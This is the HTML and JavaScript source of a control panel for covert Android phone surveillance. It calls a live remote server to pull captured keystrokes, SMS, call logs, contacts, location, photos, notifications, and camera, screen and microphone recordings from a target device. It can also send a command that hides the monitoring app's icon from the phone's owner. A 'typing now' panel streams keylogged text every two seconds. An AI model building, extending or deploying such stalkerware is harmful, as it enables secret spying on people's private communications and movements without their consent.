<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Control Center</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.1);
            --glass-border: rgba(255, 255, 255, 0.15);
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --accent: #4caf50;
            --offline: #ff4444;
            --cyan: #00f3ff;
            --slider-bg: rgba(60, 60, 60, 0.6);
            --slider-fill: rgba(255, 255, 255, 1);
        }
        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; 
            /* Body padding badhaya taaki last me scroll karne ki jagah bache */
            padding: 15px 15px 50px 15px; 
            display: flex; flex-direction: column; align-items: center;
            min-height: 100vh;
            touch-action: pan-y; 
            overflow-y: auto; /* Ensure vertical scrolling works on phone */
        }
        
        /* --- FIXED CONTAINER (Responsive Fix) --- */
        .container {
            width: 100%; 
            max-width: 400px; 
            background: rgba(0, 0, 0, 0.5);
            border-radius: 25px; 
            padding: 15px;
            border: 1px solid var(--glass-border);
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            box-sizing: border-box;
            /* Height ko auto rakha taaki content na kate */
            height: auto;
            display: flex;
            flex-direction: column;
        }

        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        .device-name { font-size: 1rem; font-weight: bold; text-transform: uppercase; color: var(--cyan); }
        .status-badge {
            background: #222; padding: 4px 10px; border-radius: 20px;
            font-size: 0.7rem; display: flex; align-items: center; gap: 6px;
        }
        .dot { height: 8px; width: 8px; border-radius: 50%; background: #555; transition: 0.3s; }
        .dot.online { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
        .dot.offline { background: var(--offline); box-shadow: 0 0 8px var(--offline); }
        
        .info-panel { display: flex; gap: 10px; margin-bottom: 15px; }
        .info-card {
            flex: 1; background: var(--glass-bg); padding: 10px;
            border-radius: 12px; border: 1px solid var(--glass-border);
            text-align: center;
        }
        .label { font-size: 0.6rem; color: var(--text-muted); letter-spacing: 1px; margin-bottom: 4px; }
        .value { font-size: 0.85rem; font-weight: 500; }
        
        .battery-details { background: rgba(255,255,255,0.03); border-radius: 12px; padding: 12px; margin-bottom: 15px; }
        .battery-header { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 0.8rem; }
        .battery-bar-bg { width: 100%; height: 5px; background: #333; border-radius: 10px; overflow: hidden; }
        .battery-bar-fill { width: 0%; height: 100%; background: var(--accent); transition: 1s ease-in-out; }

        /* --- LIVE STATUS BOX --- */
        .live-status-card {
            background: rgba(0, 243, 255, 0.08);
            border: 1px solid rgba(0, 243, 255, 0.3);
            border-radius: 12px; padding: 12px; margin-bottom: 20px;
            display: flex; align-items: center; gap: 12px;
            animation: pulse-border 2s infinite;
        }
        @keyframes pulse-border {
            0% { box-shadow: 0 0 0 0 rgba(0, 243, 255, 0.2); }
            70% { box-shadow: 0 0 0 6px rgba(0, 243, 255, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 243, 255, 0); }
        }

        .live-icon {
            width: 35px; height: 35px; background: rgba(0, 243, 255, 0.2);
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            color: var(--cyan); font-size: 1rem;
        }
        .live-content { flex: 1; overflow: hidden; }
        .live-label { font-size: 0.65rem; color: var(--cyan); letter-spacing: 0.5px; margin-bottom: 2px; text-transform: uppercase; font-weight: bold; }
        .live-text { font-size: 0.85rem; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

        /* --- SWIPE SLIDER STYLES (FIXED) --- */
        .slider-wrapper {
            width: 100%;
            /* Fixed: Removed overflow:hidden to let content grow */
            overflow: hidden; 
            margin-bottom: 5px;
            flex-grow: 1;
        }
        .slides-container {
            display: flex;
            overflow-x: auto;
            scroll-snap-type: x mandatory;
            scroll-behavior: smooth;
            -webkit-overflow-scrolling: touch;
            /* Important for vertical sizing */
            align-items: flex-start; 
        }
        .slides-container::-webkit-scrollbar { display: none; }
        
        .slide-page {
            min-width: 100%;
            scroll-snap-align: start;
            /* Isse height content ke hisaab se adjust hogi */
            height: auto; 
            padding-bottom: 10px;
        }

        /* --- GRID LAYOUT (FIXED SPACING) --- */
        .controls-grid { 
            display: grid; 
            grid-template-columns: repeat(4, 1fr); 
            /* Fixed: Fixed height hata kar auto kar diya */
            grid-auto-rows: minmax(75px, auto); 
            gap: 10px; /* Gap thora badhaya */
            width: 100%;
            /* Niche extra padding di taaki last button na kate */
            padding-bottom: 10px; 
        }

        .slider-card {
            grid-row: span 2; 
            background: var(--slider-bg);
            border-radius: 16px; position: relative; overflow: hidden;
            display: flex; align-items: flex-end; justify-content: center;
            border: 1px solid var(--glass-border); touch-action: none; width: 100%; 
            height: 100%; /* Ensure it fills row span */
        }

        .slider-fill {
            position: absolute; bottom: 0; left: 0; right: 0;
            background: var(--slider-fill); width: 100%; height: 50%;
            transition: height 0.1s linear; pointer-events: none;
        }

        .slider-icon {
            position: absolute; bottom: 12px; font-size: 1rem; z-index: 5;
            color: #555; transition: color 0.2s; pointer-events: none;
        }

        .vertical-range {
            position: absolute; width: 200px; height: 100%;
            top: 0; left: 50%; transform: translate(-50%, 0) rotate(-90deg);
            opacity: 0; cursor: ns-resize; z-index: 10;
        }
        
        .control-btn {
            background: var(--glass-bg); border-radius: 14px; 
            height: 100%; min-height: 75px; /* Minimum height fix */
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            border: 1px solid var(--glass-border); cursor: pointer;
            transition: 0.2s; text-decoration: none; color: var(--text-main);
            overflow: hidden;
            box-sizing: border-box;
        }
        .control-btn:hover { background: rgba(255, 255, 255, 0.15); transform: translateY(-2px); border-color: var(--accent); }
        
        .control-btn i { font-size: 1.1rem; margin-bottom: 5px; }
        .control-btn span { font-size: 0.55rem; text-align: center; color: #bbb; white-space: nowrap; }

        .control-btn.active-state { background: rgba(255, 255, 255, 0.9); color: #000; }
        .control-btn.active-state span { color: #333; }
        
        .pagination-dots {
            display: flex; justify-content: center; gap: 8px;
            margin-top: 10px; margin-bottom: 10px;
        }
        .pagination-dots .p-dot {
            width: 6px; height: 6px; background: #444;
            border-radius: 50%; transition: 0.3s;
        }
        .pagination-dots .p-dot.active { background: #fff; width: 18px; border-radius: 10px; }

        .id-display { 
            margin-bottom: 15px; font-size: 0.85rem; color: var(--cyan); cursor: pointer; 
            border: 1px dashed var(--cyan); padding: 10px 20px; border-radius: 12px;
            background: rgba(0, 243, 255, 0.05); text-align: center;
            width: 90%; max-width: 300px; margin-left: auto; margin-right: auto;
        }
        
        .footer-link {
            text-align: center; margin-top: 15px; font-size: 0.75rem;
            color: #555; cursor: pointer; text-decoration: none;
        }
        .footer-link:hover { color: var(--text-muted); }
    </style>
</head>
<body>

    <div id="idInputPanel" class="id-display" onclick="askID()">
        <i class="fa-solid fa-id-card"></i> Tap to Enter Monitoring ID
    </div>

    <div class="container">
        <div class="header">
            <div>
                <i class="fa-solid fa-mobile-side"></i>
                <span class="device-name" id="deviceName">Searching...</span>
            </div>
            <div class="status-badge">
                <span id="statusDot" class="dot"></span>
                <span id="statusText">Connecting...</span>
            </div>
        </div>

        <div class="info-panel">
            <div class="info-card">
                <div class="label">ANDROID</div>
                <div id="androidVer" class="value">--</div>
            </div>
            <div class="info-card">
                <div class="label">STATUS</div>
                <div id="networkType" class="value">--</div>
            </div>
        </div>

        <div class="battery-details">
            <div class="battery-header">
                <span class="label">BATTERY LEVEL</span>
                <span id="batteryPercent" class="value">0%</span>
            </div>
            <div class="battery-bar-bg">
                <div id="batteryFill" class="battery-bar-fill"></div>
            </div>
            <div id="batteryStatus" style="font-size: 0.7rem; color: var(--text-muted); margin-top: 8px;">Waiting...</div>
        </div>

        <div class="live-status-card">
            <div class="live-icon" id="liveIcon">
                <i class="fa-solid fa-pulse"></i>
            </div>
            <div class="live-content">
                <div class="live-label" id="liveLabel">Live Activity</div>
                <div class="live-text" id="liveText">Waiting for updates...</div>
            </div>
        </div>

        <div class="slider-wrapper">
            <div class="slides-container" onscroll="updateDots(this)">
                
                <div class="slide-page">
                    <div class="controls-grid">
                        <div onclick="openView('screen')" class="control-btn"><i class="fa-solid fa-mobile-screen"></i><span>Screen</span></div>
                        <div onclick="openView('camera')" class="control-btn"><i class="fa-solid fa-camera"></i><span>Camera</span></div>
                        
                        <div class="slider-card">
                            <div class="slider-fill" id="brightFill" style="height: 50%;"></div>
                            <i class="fa-solid fa-sun slider-icon" id="brightIcon"></i>
                            <input type="range" min="0" max="100" value="50" class="vertical-range" 
                                   oninput="updateSliderUI('bright', this.value)" 
                                   onchange="sendCommand('brightness:'+this.value)">
                        </div>

                        <div class="slider-card">
                            <div class="slider-fill" id="volFill" style="height: 50%;"></div>
                            <i class="fa-solid fa-volume-high slider-icon" id="volIcon"></i>
                            <input type="range" min="0" max="100" value="50" class="vertical-range" 
                                   oninput="updateSliderUI('vol', this.value)" 
                                   onchange="sendCommand('volume:'+this.value)">
                        </div>

                        <div onclick="openView('location')" class="control-btn"><i class="fa-solid fa-location-dot"></i><span>Location</span></div>
                        <div onclick="openView('audio')" class="control-btn"><i class="fa-solid fa-microphone"></i><span>Audio</span></div>
                        
                        <div onclick="openView('gallery')" class="control-btn"><i class="fa-solid fa-images"></i><span>Gallery</span></div>
                        <div onclick="openView('notifications')" class="control-btn"><i class="fa-regular fa-message"></i><span>Notify</span></div>
                        <div class="control-btn" id="soundBtn" onclick="cycleSoundMode()">
                            <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Normal</span>
                        </div>
                        <div class="control-btn" id="recBtn" onclick="toggleRec()">
                            <i class="fa-solid fa-circle-dot"></i><span>Rec</span>
                        </div>
                        
                        <div onclick="openDirect('whatsapp.html')" class="control-btn"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></div>
                        <div onclick="openDirect('instagram.html')" class="control-btn"><i class="fa-brands fa-instagram"></i><span>Instagram</span></div>
                        <div onclick="openDirect('snap.html')" class="control-btn"><i class="fa-brands fa-snapchat"></i><span>Snapchat</span></div>
                        <div onclick="openView('apps')" class="control-btn"><i class="fa-brands fa-google-play"></i><span>Apps</span></div>

                        <div onclick="openView('call_logs')" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></div>
                        <div onclick="openView('contacts')" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></div>
                        <div onclick="openView('sms')" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></div>
                        
                        <div id="hideAppBtn" onclick="toggleAppVisibility()" class="control-btn" style="color: #ff4444; border-color: rgba(255, 68, 68, 0.3);">
                            <i id="hideAppIcon" class="fa-solid fa-eye-slash"></i><span id="hideAppText">Hide App</span>
                        </div>
                    </div>
                </div>

                <div class="slide-page">
                    <div class="controls-grid">
                        
                        <div onclick="openDirect('snapshot_menu.html')" class="control-btn" style="border-color: #00f3ff;">
                            <i class="fa-solid fa-camera-rotate" style="color: #00f3ff;"></i>
                            <span>Snapshot</span>
                        </div>

                        <div onclick="openDirect('saved_files.html')" class="control-btn" style="border-color: #ff9800;">
                            <i class="fa-solid fa-cloud-arrow-down" style="color: #ff9800;"></i>
                            <span>Saved Files</span>
                        </div>

                    </div>
                </div>

            </div>
        </div>

        <div class="pagination-dots">
            <span class="p-dot active"></span>
            <span class="p-dot"></span>
        </div>
        <div class="footer-link" onclick="resetID()">
            <i class="fa-solid fa-pen"></i> Change Device ID
        </div>

    </div>

    <script>
        const API_BASE = 'https://child-v9no.onrender.com';
        let DEVICE_ID = localStorage.getItem('monitoring_id') || '';

        function initDashboard() {
            if(DEVICE_ID) {
                document.getElementById('idInputPanel').style.display = 'none';
                const cachedModel = localStorage.getItem('last_model');
                if(cachedModel) {
                    document.getElementById('deviceName').innerText = cachedModel;
                    setStatus(true);
                }
                updateDashboard();
                fetchLiveStatus(); 
            } else {
                document.getElementById('idInputPanel').style.display = 'block';
            }
        }

        function updateDots(container) {
            const scrollLeft = container.scrollLeft;
            const width = container.offsetWidth;
            const index = Math.round(scrollLeft / width);
            
            const dots = document.querySelectorAll('.pagination-dots .p-dot');
            dots.forEach(d => d.classList.remove('active'));
            if(dots[index]) dots[index].classList.add('active');
        }

        function askID() {
            let id = prompt("Phone App mein dikhne waali ID dalo:", DEVICE_ID);
            if (id && id.trim() !== "") {
                DEVICE_ID = id.trim().toUpperCase();
                localStorage.setItem('monitoring_id', DEVICE_ID);
                document.getElementById('idInputPanel').style.display = 'none';
                updateDashboard();
            }
        }

        function resetID() {
            if(confirm("Change Device ID? Current: " + DEVICE_ID)) {
                localStorage.removeItem('monitoring_id');
                localStorage.removeItem('last_model');
                location.reload();
            }
        }

        function setStatus(isOnline) {
             const dot = document.getElementById('statusDot');
             const statusText = document.getElementById('statusText');
             if(isOnline) {
                dot.className = "dot online";
                statusText.innerText = "Connected";
                statusText.style.color = "#4caf50";
            } else {
                dot.className = "dot offline";
                statusText.innerText = "Disconnected";
                statusText.style.color = "#ff4444";
            }
        }

        function updateDashboard() {
            if (!DEVICE_ID) return;
            
            fetch(`${API_BASE}/api/device-status/${DEVICE_ID}`)
                .then(res => res.json())
                .then(data => {
                    if(data.id) {
                        document.getElementById('deviceName').innerText = data.model || DEVICE_ID;
                        localStorage.setItem('last_model', data.model || DEVICE_ID);
                        document.getElementById('androidVer').innerText = data.version || "--";
                        setStatus(data.isOnline);
                        document.getElementById('networkType').innerText = data.isOnline ? "Online" : "Last Seen";
                        
                        const battery = data.battery || 0;
                        document.getElementById('batteryPercent').innerText = battery + "%";
                        document.getElementById('batteryFill').style.width = battery + "%";
                        document.getElementById('batteryStatus').innerText = data.charging ? "‚ö° Charging..." : "üîã On Battery";
                    }
                })
                .catch(err => console.log("Connection Error:", err));
        }

        async function fetchLiveStatus() {
            if(!DEVICE_ID) return;

            try {
                const [keylogs, notifs] = await Promise.all([
                    fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/keylogs`).then(r=>r.json()).catch(()=>[]),
                    fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/notifications`).then(r=>r.json()).catch(()=>[])
                ]);

                let lastActivity = null;
                const recentCall = notifs.find(n => 
                    (n.title && (n.title.toLowerCase().includes('call') || n.title.toLowerCase().includes('ringing'))) || 
                    (n.text && (n.text.toLowerCase().includes('incoming call')))
                );
                const recentKeylog = keylogs.length > 0 ? keylogs[keylogs.length - 1] : null;
                const liveIcon = document.getElementById('liveIcon');
                const liveLabel = document.getElementById('liveLabel');
                const liveText = document.getElementById('liveText');

                if (recentCall) {
                    liveIcon.innerHTML = '<i class="fa-solid fa-phone-volume" style="animation:tada 1s infinite;"></i>';
                    liveLabel.innerText = "üìû ACTIVE CALL";
                    liveLabel.style.color = "#ff4444"; 
                    liveText.innerText = `${recentCall.title}: ${recentCall.text}`;
                } 
                else if (recentKeylog) {
                    liveIcon.innerHTML = '<i class="fa-regular fa-keyboard"></i>';
                    liveLabel.innerText = "‚å®Ô∏è TYPING NOW";
                    liveLabel.style.color = "#00f3ff";
                    liveText.innerText = `"${recentKeylog.text}"`; 
                } 
                else {
                    liveIcon.innerHTML = '<i class="fa-solid fa-check"></i>';
                    liveLabel.innerText = "DEVICE ACTIVE";
                    liveLabel.style.color = "#4caf50";
                    liveText.innerText = "No recent typing or calls.";
                }

            } catch (e) { console.log(e); }
        }

        function openView(page) {
            if(!DEVICE_ID) return askID();

            const commands = {
                'gallery': 'gallery', 'location': 'location', 'sms': 'sms',
                'call_logs': 'call_logs', 'contacts': 'contacts'
            };

            if (commands[page]) {
                sendCommand(commands[page]);
                const btn = event.currentTarget;
                const originalText = btn.querySelector('span').innerText;
                btn.querySelector('span').innerText = "Requesting...";
                
                setTimeout(() => {
                    btn.querySelector('span').innerText = originalText;
                    window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
                }, 1500);
            } else {
                window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
            }
        }

        function openDirect(filename) {
            if(!DEVICE_ID) return askID();
            window.location.href = `${filename}?id=${DEVICE_ID}`;
        }

        function sendCommand(action) {
            if(!DEVICE_ID) return askID();
            fetch(`${API_BASE}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: action })
            })
            .then(res => console.log("Sent Success: " + action))
            .catch(err => console.error("Send Failed", err));
        }

        let isAppHidden = false;

        function toggleAppVisibility() {
            if(!DEVICE_ID) return askID();

            const btn = document.getElementById('hideAppBtn');
            const icon = document.getElementById('hideAppIcon');
            const text = document.getElementById('hideAppText');

            if (!isAppHidden) {
                if(confirm("Confirm: Hide App Icon from Phone?")) {
                    sendCommand('hide_app'); 
                    
                    isAppHidden = true;
                    icon.className = "fa-solid fa-eye"; 
                    text.innerText = "Show App";
                    btn.style.color = "#4caf50"; 
                    btn.style.borderColor = "rgba(76, 175, 80, 0.3)";
                    alert("Command Sent: Hiding App...");
                }
            } else {
                sendCommand('show_app'); 
                
                isAppHidden = false;
                icon.className = "fa-solid fa-eye-slash"; 
                text.innerText = "Hide App";
                btn.style.color = "#ff4444"; 
                btn.style.borderColor = "rgba(255, 68, 68, 0.3)";
                alert("Command Sent: Showing App...");
            }
        }

        function updateSliderUI(type, val) {
            document.getElementById(`${type}Fill`).style.height = val + "%";
            const icon = document.getElementById(`${type}Icon`);
            if(val > 25) { icon.style.color = "#333"; } else { icon.style.color = "#fff"; }
        }

        let modes = ['normal', 'vibrate', 'silent'];
        let icons = ['fa-bell', 'fa-vibration', 'fa-bell-slash'];
        let labels = ['Normal', 'Vibrate', 'Silent'];
        let currentModeIndex = 0;

        function cycleSoundMode() {
            currentModeIndex = (currentModeIndex + 1) % 3;
            const icon = document.getElementById('soundIcon');
            const text = document.getElementById('soundText');
            const btn = document.getElementById('soundBtn');
            icon.className = `fa-solid ${icons[currentModeIndex]}`;
            text.innerText = labels[currentModeIndex];
            if(modes[currentModeIndex] === 'silent' || modes[currentModeIndex] === 'vibrate') {
                 btn.classList.add('active-state');
            } else {
                 btn.classList.remove('active-state');
            }
            sendCommand(modes[currentModeIndex]);
        }

        let isRecording = false;
        function toggleRec() {
            isRecording = !isRecording;
            const btn = document.getElementById('recBtn');
            if(isRecording) {
                btn.classList.add('active-state');
                btn.querySelector('span').innerText = "Stop Rec";
                sendCommand('rec_start');
            } else {
                btn.classList.remove('active-state');
                 btn.querySelector('span').innerText = "Rec";
                sendCommand('rec_stop');
            }
        }

        setInterval(updateDashboard, 5000);
        setInterval(fetchLiveStatus, 2000); 
        window.onload = initDashboard;
    </script>
</body> 
</html>
